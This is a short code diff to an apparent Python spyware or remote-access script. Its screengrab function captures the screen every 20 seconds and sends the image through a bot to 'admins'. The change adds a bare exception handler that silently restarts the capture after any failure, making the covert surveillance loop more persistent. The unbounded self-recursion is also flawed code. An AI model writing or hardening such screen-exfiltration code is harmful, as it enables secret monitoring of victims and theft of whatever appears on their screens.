@@ -32,8 +32,12 @@ def Work():
 Work()
 
 def screengrab():
-    time.sleep(20)
-    png = get_screenshots_bytes()
-    bot.send_photo(admins, png)
-    screengrab()
+    try:
+        time.sleep(20)
+        png = get_screenshots_bytes()
+        bot.send_photo(admins, png)
+        screengrab()
+    except:
+        time.sleep(60)
+        screengrab()
 screengrab()
